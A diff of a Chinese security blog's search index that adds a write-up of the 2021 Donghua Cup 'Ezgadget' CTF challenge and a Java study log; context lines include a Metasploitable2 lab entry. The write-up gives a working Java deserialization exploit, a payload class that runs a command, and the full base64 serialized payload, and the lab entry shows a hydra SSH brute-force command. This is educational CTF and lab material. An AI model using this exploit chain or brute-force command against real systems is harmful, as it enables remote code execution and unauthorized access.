@@ -1,6 +1,43 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2021东华杯Ezgadget复现</title>
+    <url>/2024/04/29/2021%E4%B8%9C%E5%8D%8E%E6%9D%AFEzgadget%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>入门第一道题目</p>
+<hr>
+<p>运行jar包，访问8888端口，发现只是正常index返回。</p>
+<p>–&gt;<img src="/2024/04/29/2021%E4%B8%9C%E5%8D%8E%E6%9D%AFEzgadget%E5%A4%8D%E7%8E%B0/04/29/2021%E4%B8%9C%E5%8D%8E%E6%9D%AFEzgadget%E5%A4%8D%E7%8E%B0/%7B2D3EFA75-399F-4f49-A782-977543D9E7B5%7D.png" class title="img">所所以还是反编译jar包看一下：</p>
+<h5 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/tools/Tools.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tools</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String base64) &#123;</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">decoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="keyword">return</span> decoder.decode(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该类下是执行了一个base64的加密和解密以及序列化和反序列化的过程</p>
+<h5 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/tools/ToStringBean.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToStringBean</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] ClassByte;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> toStringBean.defineClass((String) <span class="literal">null</span>, <span class="built_in">this</span>.ClassByte, <span class="number">0</span>, <span class="built_in">this</span>.ClassByte.length);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz.newInstance();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;enjoy it.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;enjoy it.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;enjoy it.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该类重写了tostring方法‘。<strong>ToStringBean</strong>: 继承了ClassLoader，而这可以通过调用defineClass，从而动态加载一个类，将这个类实例化从而达到命令执行。这里只要能调用<code>toString</code>就能加载我们传入的恶意字节码，其中ClassByte就是我们要传入的恶意字节码，由于是私有的，所以只能通过反射来进行赋值。</p>
+<h5 id="User"><a href="#User" class="headerlink" title="User"></a>User</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/bean/User.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String UserName;</span><br><span class="line">    <span class="keyword">private</span> String PassWord;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.UserName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserName</span><span class="params">(String userName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.UserName = userName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassWord</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.PassWord;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassWord</span><span class="params">(String passWord)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.PassWord = passWord;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;UserName=&#x27;&quot;</span> + <span class="built_in">this</span>.UserName + <span class="string">&quot;&#x27;, PassWord=&#x27;&quot;</span> + <span class="built_in">this</span>.PassWord + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该类是典型的bean，规定了user的内容</p>
+<p>重点地方是下面这个类</p>
+<h5 id="IndexController"><a href="#IndexController" class="headerlink" title="IndexController"></a>IndexController</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.xml.BeanDefinitionParserDelegate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/controller/IndexController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BeanDefinitionParserDelegate.INDEX_ATTRIBUTE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/readobject&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">unser</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] b = Tools.base64Decode(data);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> objectInputStream.readUTF();</span><br><span class="line">        <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> objectInputStream.readInt();</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">&quot;gadgets&quot;</span>) &amp;&amp; year == <span class="number">2021</span>) &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;welcome bro.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;welcome bro.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从中我们可以看到在readobject路由下，会接受一个POST参数<code>data</code>，之后会对<code>data</code>参数进行base64编码，并将其(<code>InputStream</code>)转化为一个对象流，从中读取UTF(<code>readUTF()</code>)和INT(<code>readInt()</code>),将得到的UTF与“gadgets”对比，Int与2021对比，相等则执行<code>objectInputStream.readObject();</code></p>
+<p>所以·对data参数进行反序列化，<code>toStringBean</code>类重写了<code>toString</code>方法。然后<code>BadAttributeValueExpException</code>类的readobject方法中调用了<code>val</code>的<code>toString()</code>方法，<code>val</code>可以传入<code>toStringBean</code>，从而在调用<code>BadAttributeValueExpException</code>的<code>readobject</code>的时候调用的<code>toStringBean</code>的<code>toString()</code>方法。</p>
+<p>因而我们的exp为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">         <span class="type">ToStringBean</span> <span class="variable">tostringbean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>();</span><br><span class="line">         <span class="comment">//反射修改classByte属性</span></span><br><span class="line">         <span class="type">Field</span> <span class="variable">classByteField</span> <span class="operator">=</span> tostringbean.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">         classByteField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">         <span class="comment">//C:\Users\a\Desktop\javaaudit\webpoc\src\payload.java</span></span><br><span class="line">        <span class="type">byte</span>[] classByteone = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\a\\Desktop\\javaaudit\\webpoc\\src\\com\\ezgame\\ctf\\payload.class&quot;</span>));</span><br><span class="line">         classByteField.set(tostringbean, classByteone);</span><br><span class="line"></span><br><span class="line">         <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">11223</span>);</span><br><span class="line">         <span class="comment">//反射修改val属性</span></span><br><span class="line">         <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">         valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">         valField.set(badAttributeValueExpException, tostringbean);</span><br><span class="line">         <span class="type">ByteArrayOutputStream</span>  <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">         <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">         <span class="comment">//序列化payload.java的字节码</span></span><br><span class="line">         objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">         objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">         objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">         <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">         <span class="type">String</span> <span class="variable">base64String1</span> <span class="operator">=</span> Tools.base64Encode(bytes1);</span><br><span class="line">        System.out.println(base64String1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf;<span class="comment">//这里包名不要变，要与jar包中保持一致</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">payload</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用cmd下命令<code>java -jar payload.java</code>编译成class文件</p>
+<p>最终得到</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">rO0ABXcNAAdnYWRnZXRzAAAH5XNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAFXQAA0V4cHQACEV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IAIWNvbS5lemdhbWUuY3RmLnRvb2xzLlRvU3RyaW5nQmVhbhPMVFon2dx5AgABWwAJQ2xhc3NCeXRldAACW0J4cHVyAAJbQqzzF/gGCFTgAgAAeHAAAAIDyv66vgAAADcAIAoACAARCgASABMIABQKABIAFQcAFgoABQAXBwAYBwAZAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAxwYXlsb2FkLmphdmEMAAkACgcAGgwAGwAcAQAEY2FsYwwAHQAeAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAHwAKAQAWY29tL2V6Z2FtZS9jdGYvcGF5bG9hZAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAACAAEACQAKAAEACwAAAB0AAQABAAAABSq3AAGxAAAAAQAMAAAABgABAAAABQAIAA0ACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAAAgACQAMAAwACgANAAsAEQANAA4AAAAHAAJMBwAFBAABAA8AAAACABA=</span><br></pre></td></tr></table></figure>
+
+<p>但传入参数时注意url编码，因为base64编码后存在+号，而url传参时会将+号识别为空格。</p>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>GZCTF安装时数据库报错解决</title>
     <url>/2024/03/23/GZCTF%E5%AE%89%E8%A3%85%E6%97%B6%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
     <content><![CDATA[<h2 id="GZCTF安装时数据库报错解决"><a href="#GZCTF安装时数据库报错解决" class="headerlink" title="GZCTF安装时数据库报错解决"></a>GZCTF安装时数据库报错解决</h2><p>GZCTF 通过 Docker 镜像的方式提供，你可以通过 docker-compose 的方式快速部署一个功能完善的 CTF 平台。我们在安装时，尤其是在一些版本下的系统会存在数据库配置问题。</p>
@@ -140,7 +177,7 @@
 <h3 id="22端口攻击"><a href="#22端口攻击" class="headerlink" title="22端口攻击"></a>22端口攻击</h3><blockquote>
 <p>nmap下sV扫描版本信息为  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)，msf直接搜索漏洞未果，那么有可能像ftp匿名登录或者弱口令，利用hydra直接爆破</p>
 <p>hydra 192.168.206.216 -L user字典 -P  passwd字典 -u IP ssh,由于没得字典，所以利用了其他工具得到账户msfdamin&#x2F;msfadmin ,但是没想到还扫出来多个弱口令，比如ftp的匿名登录</p>
-<p>kali下登录ssh <a href="mailto:&#109;&#115;&#102;&#x61;&#100;&#109;&#x69;&#110;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x38;&#48;&#46;&#49;&#x32;&#x39;">&#109;&#115;&#102;&#x61;&#100;&#109;&#x69;&#110;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x38;&#48;&#46;&#49;&#x32;&#x39;</a> 连接成功后拿到shell,但不是root权限，后续步骤或拿去权限（其实sudo -i可root账户）</p>
+<p>kali下登录ssh <a href="mailto:&#x6d;&#115;&#102;&#x61;&#100;&#109;&#x69;&#110;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#56;&#48;&#46;&#49;&#x32;&#57;">&#x6d;&#115;&#102;&#x61;&#100;&#109;&#x69;&#110;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#56;&#48;&#46;&#49;&#x32;&#57;</a> 连接成功后拿到shell,但不是root权限，后续步骤或拿去权限（其实sudo -i可root账户）</p>
 </blockquote>
 <p><img src="/2023/11/04/Metasploitable2%E9%9D%B6%E6%9C%BA%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png" alt="7"></p>
 <h3 id="23端口攻击"><a href="#23端口攻击" class="headerlink" title="23端口攻击"></a>23端口攻击</h3><blockquote>
@@ -327,6 +364,33 @@
       </categories>
       <tags>
         <tag>渗透测试，路由</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>java安全学习打卡记录</title>
+    <url>/2024/04/07/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%89%93%E5%8D%A1%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>2024.3.29 java资源查找</p>
+<p>2024.4.5 java基础操作</p>
+<p>2024.4.6，学习到了override和overload类</p>
+<p>2024.4.8，在up主<strong>首席bug专家</strong>的java课程学习到了object对象 p78课时</p>
+<p>2024.4.9，java课程学习到了封装  p82课时</p>
+<p>2024.4.10 ，java课程学习到了多态，抽象，接口 p87课时</p>
+<p>2024.4.11，java课程学习回顾</p>
+<h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><h3 id="SpringBoot学习"><a href="#SpringBoot学习" class="headerlink" title="SpringBoot学习"></a>SpringBoot学习</h3><p>2024.4.12，学习创建项目，hello world网站开始搭建和配置文件application.properties的认识</p>
+<p>2024.4.14  学习了注解的用法</p>
+<h2 id="java反序列化–并行"><a href="#java反序列化–并行" class="headerlink" title="java反序列化–并行"></a>java反序列化–并行</h2><p>2024.4.16 学习了如何继承序列化接口-&gt;.ser文件，在反序列化中执行系统函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>使用如下读取数据：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">   <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">   <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">while</span> ((line = reader.readLine())!= <span class="literal">null</span>) &#123;</span><br><span class="line">       System.out.println(line);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>（@~@)Java读写内容好难受啊qwq!</p>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
       </tags>
   </entry>
   <entry>
@@ -722,82 +786,6 @@
       </tags>
   </entry>
   <entry>
-    <title>线性结构总结</title>
-    <url>/2023/11/01/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h1 id="线性结构总结"><a href="#线性结构总结" class="headerlink" title="线性结构总结"></a>线性结构总结</h1><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p>线性表是由n&gt;&#x3D;0个性质相同的数据元素组成的有限序列，n为线性长度。</p>
-<p>线性表的主要操作包括创建空线性表，判断线性表是否为空，以及插入，删除和查找等操作。</p>
-<h3 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h3><p>顺序表是用一组地址连续的储存单元依次储线性表中的各个元素，通过位置来表示数据元素之间的线性逻辑关系。</p>
-<p>顺序表的相邻元素在物理位置上也是相邻的。</p>
-<blockquote>
-<p>优点：</p>
-<ul>
-<li>可以快速获取下标的数据元素，时间复杂度为O(1)</li>
-<li>逻辑关系是一对一的关系，连续存储单元足以储存，不需要增加额外的存储空间</li>
-</ul>
-<p>缺点：</p>
-<ul>
-<li>插入和删除操作需要移动大量的元素，时间复杂度为O(n)</li>
-<li>线性表的存储空间大小难以确定，并且不好扩展</li>
-<li>造成存储空间碎片化</li>
-</ul>
-</blockquote>
-<p>  以下为顺序表的基本功能</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    SeqList slist = (SeqList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> List)); <span class="comment">/*申请结构体List空间*/</span></span><br><span class="line">    <span class="keyword">if</span> (slist != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem = (DataType*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DataType) * m);</span><br><span class="line">        <span class="comment">/*申请顺序表空间，大小为m个DataType空间*/</span></span><br><span class="line">        <span class="keyword">if</span> (slist-&gt;elem) &#123;</span><br><span class="line">            slist-&gt;Max = m;<span class="comment">/*顺序表的最大值*/</span></span><br><span class="line">            slist-&gt;n = <span class="number">0</span>; <span class="comment">/*顺序表长度赋值为0*/</span></span><br><span class="line">            <span class="keyword">return</span>(slist);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">free</span>(slist);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;out of space!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsNullList_seq</span><span class="params">(SeqList slist)</span><span class="comment">/*判断顺序表是否为空*/</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(slist-&gt;n == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPre_seq</span><span class="params">(SeqList slist, <span class="type">int</span> p, DataType x)</span></span><br><span class="line"><span class="comment">/*在线性表slist的p位置之前插入x*/</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="keyword">if</span> (slist-&gt;n &gt;= slist-&gt;Max) &#123; <span class="comment">/*顺序表满溢出*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p&lt;<span class="number">0</span> || p&gt;slist-&gt;n) &#123;  <span class="comment">/*不存在下标为p的元素*/</span></span><br><span class="line">        <span 